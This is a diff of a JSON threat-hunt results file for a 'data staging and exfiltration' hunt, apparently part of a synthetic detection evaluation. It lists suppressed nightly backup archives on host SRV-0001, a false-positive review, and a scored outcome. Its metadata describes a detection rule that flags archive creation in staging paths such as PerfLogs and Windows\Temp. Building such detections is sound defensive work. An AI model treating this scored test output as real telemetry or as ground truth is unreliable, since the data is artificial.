+        "evidence": {
+          "archive": "D:\\Backups\\nightly-00.7z",
+          "archive_size": 944277905,
+          "baseline_p95": 1333.0,
+          "destination": "backup-target.northwind.example",
+          "external": false,
+          "external_bytes": 0,
+          "host": "SRV-0001",
+          "internal_bytes": 472138952,
+          "off_hours": true,
+          "ratio": 354192.8,
+          "suspicious_path": false,
+          "ts": "2026-09-07T01:01:36Z",
+          "user": "svc-backup"
+        },
+        "explanation": "nightly-00.7z (944 MB) created in D:\\Backups\\nightly-00.7z, then 472 MB egress within 30m (354,193x host p95) to internal backup-target.northwind.example; off-hours; internal backup target -> suppressed",
+        "score": 11.0,
+        "verdict": "benign"
+      },
+      {
+        "entity": "SRV-0001 / nightly-01.7z",
+        "evidence": {
+          "archive": "D:\\Backups\\nightly-01.7z",
+          "archive_size": 1260065481,
+          "baseline_p95": 1333.0,
+          "destination": "backup-target.northwind.example",
+          "external": false,
+          "external_bytes": 0,
+          "host": "SRV-0001",
+          "internal_bytes": 630032740,
+          "off_hours": true,
+          "ratio": 472642.7,
+          "suspicious_path": false,
+          "ts": "2026-09-08T01:24:25Z",
+          "user": "svc-backup"
+        },
+        "explanation": "nightly-01.7z (1260 MB) created in D:\\Backups\\nightly-01.7z, then 630 MB egress within 30m (472,643x host p95) to internal backup-target.northwind.example; off-hours; internal backup target -> suppressed",
+        "score": 11.0,
+        "verdict": "benign"
+      },
+      {
+        "entity": "SRV-0001 / nightly-02.7z",
+        "evidence": {
+          "archive": "D:\\Backups\\nightly-02.7z",
+          "archive_size": 1102005058,
+          "baseline_p95": 1333.0,
+          "destination": "backup-target.northwind.example",
+          "external": false,
+          "external_bytes": 1483,
+          "host": "SRV-0001",
+          "internal_bytes": 551002529,
+          "off_hours": true,
+          "ratio": 413356.3,
+          "suspicious_path": false,
+          "ts": "2026-09-09T01:25:42Z",
+          "user": "svc-backup"
+        },
+        "explanation": "nightly-02.7z (1102 MB) created in D:\\Backups\\nightly-02.7z, then 551 MB egress within 30m (413,356x host p95) to internal backup-target.northwind.example; off-hours; internal backup target -> suppressed",
+        "score": 11.0,
+        "verdict": "benign"
+      },
+      {
+        "entity": "SRV-0001 / nightly-03.7z",
+        "evidence": {
+          "archive": "D:\\Backups\\nightly-03.7z",
+          "archive_size": 931770881,
+          "baseline_p95": 1333.0,
+          "destination": "backup-target.northwind.example",
+          "external": false,
+          "external_bytes": 0,
+          "host": "SRV-0001",
+          "internal_bytes": 465885440,
+          "off_hours": true,
+          "ratio": 349501.5,
+          "suspicious_path": false,
+          "ts": "2026-09-10T01:17:01Z",
+          "user": "svc-backup"
+        },
+        "explanation": "nightly-03.7z (932 MB) created in D:\\Backups\\nightly-03.7z, then 466 MB egress within 30m (349,501x host p95) to internal backup-target.northwind.example; off-hours; internal backup target -> suppressed",
+        "score": 11.0,
+        "verdict": "benign"
+      },
+      {
+        "entity": "SRV-0001 / nightly-04.7z",
+        "evidence": {
+          "archive": "D:\\Backups\\nightly-04.7z",
+          "archive_size": 1121319406,
+          "baseline_p95": 1333.0,
+          "destination": "backup-target.northwind.example",
+          "external": false,
+          "external_bytes": 1342,
+          "host": "SRV-0001",
+          "internal_bytes": 560659703,
+          "off_hours": true,
+          "ratio": 420600.9,
+          "suspicious_path": false,
+          "ts": "2026-09-11T01:06:15Z",
+          "user": "svc-backup"
+        },
+        "explanation": "nightly-04.7z (1121 MB) created in D:\\Backups\\nightly-04.7z, then 561 MB egress within 30m (420,601x host p95) to internal backup-target.northwind.example; off-hours; internal backup target -> suppressed",
+        "score": 11.0,
+        "verdict": "benign"
+      },
+      {
+        "entity": "SRV-0001 / nightly-05.7z",
+        "evidence": {
+          "archive": "D:\\Backups\\nightly-05.7z",
+          "archive_size": 981601069,
+          "baseline_p95": 1333.0,
+          "destination": "backup-target.northwind.example",
+          "external": false,
+          "external_bytes": 0,
+          "host": "SRV-0001",
+          "internal_bytes": 490800534,
+          "off_hours": true,
+          "ratio": 368192.4,
+          "suspicious_path": false,
+          "ts": "2026-09-12T01:18:12Z",
+          "user": "svc-backup"
+        },
+        "explanation": "nightly-05.7z (982 MB) created in D:\\Backups\\nightly-05.7z, then 491 MB egress within 30m (368,192x host p95) to internal backup-target.northwind.example; off-hours; internal backup target -> suppressed",
+        "score": 11.0,
+        "verdict": "benign"
+      },
+      {
+        "entity": "SRV-0001 / nightly-06.7z",
+        "evidence": {
+          "archive": "D:\\Backups\\nightly-06.7z",
+          "archive_size": 931639367,
+          "baseline_p95": 1333.0,
+          "destination": "backup-target.northwind.example",
+          "external": false,
+          "external_bytes": 0,
+          "host": "SRV-0001",
+          "internal_bytes": 465819683,
+          "off_hours": true,
+          "ratio": 349452.1,
+          "suspicious_path": false,
+          "ts": "2026-09-13T01:26:23Z",
+          "user": "svc-backup"
+        },
+        "explanation": "nightly-06.7z (932 MB) created in D:\\Backups\\nightly-06.7z, then 466 MB egress within 30m (349,452x host p95) to internal backup-target.northwind.example; off-hours; internal backup target -> suppressed",
+        "score": 11.0,
+        "verdict": "benign"
+      },
+      {
+        "entity": "SRV-0001 / nightly-07.7z",
+        "evidence": {
+          "archive": "D:\\Backups\\nightly-07.7z",
+          "archive_size": 975756895,
+          "baseline_p95": 1333.0,
+          "destination": "backup-target.northwind.example",
+          "external": false,
+          "external_bytes": 0,
+          "host": "SRV-0001",
+          "internal_bytes": 487878447,
+          "off_hours": true,
+          "ratio": 366000.3,
+          "suspicious_path": false,
+          "ts": "2026-09-14T01:19:01Z",
+          "user": "svc-backup"
+        },
+        "explanation": "nightly-07.7z (976 MB) created in D:\\Backups\\nightly-07.7z, then 488 MB egress within 30m (366,000x host p95) to internal backup-target.northwind.example; off-hours; internal backup target -> suppressed",
+        "score": 11.0,
+        "verdict": "benign"
+      },
+      {
+        "entity": "SRV-0001 / nightly-08.7z",
+        "evidence": {
+          "archive": "D:\\Backups\\nightly-08.7z",
+          "archive_size": 1163195234,
+          "baseline_p95": 1333.0,
+          "destination": "backup-target.northwind.example",
+          "external": false,
+          "external_bytes": 0,
+          "host": "SRV-0001",
+          "internal_bytes": 581597617,
+          "off_hours": true,
+          "ratio": 436307.3,
+          "suspicious_path": false,
+          "ts": "2026-09-15T01:10:26Z",
+          "user": "svc-backup"
+        },
+        "explanation": "nightly-08.7z (1163 MB) created in D:\\Backups\\nightly-08.7z, then 582 MB egress within 30m (436,307x host p95) to internal backup-target.northwind.example; off-hours; internal backup target -> suppressed",
+        "score": 11.0,
+        "verdict": "benign"
+      }
+    ],
+    "fp_review": [
+      "Nightly backup (`SRV-0001`, svc-backup): 14 archives of ~1 GB in `D:\\Backups`, each followed by ~0.5 GB egress - to the internal `backup-target.northwind.example` -> suppressed x0.2.",
+      "30 user `report.zip` archives in Documents; no follow-on egress above the 50 MB floor -> not scored."
+    ],
+    "hunt_id": "H08",
+    "meta": {
+      "data_gaps": [
+        "No file-share audit (5145) events, so the archive's source files cannot be enumerated."
+      ],
+      "data_sources": [
+        "files",
+        "network"
+      ],
+      "decision": "new detection created",
+      "detection": "H08-archive-staging-path",
+      "entity": "host / archive",
+      "id": "H08",
+      "name": "Data staging and exfiltration",
+      "rationale": "Archive creation in a staging path (PerfLogs, Windows\\Temp, ProgramData, Public) never occurs in the baseline. Graduated as a Sigma file-event rule; the byte-spike correlation stays in the scheduled hunt.",
+      "technique": "T1567.002"
+    },
+    "score": {
+      "hunt_id": "H08",
+      "n_findings": 10,
+      "note": "",
+      "precision_at_malicious": 1.0,
+      "rank_of_first_tp": 1,
+      "technique": "T1567.002",
+      "top_entity": "WKS-0042 / archive.7z",
+      "top_is_tp": true,
+      "true_positive_found": true
+    }
+  }
+}
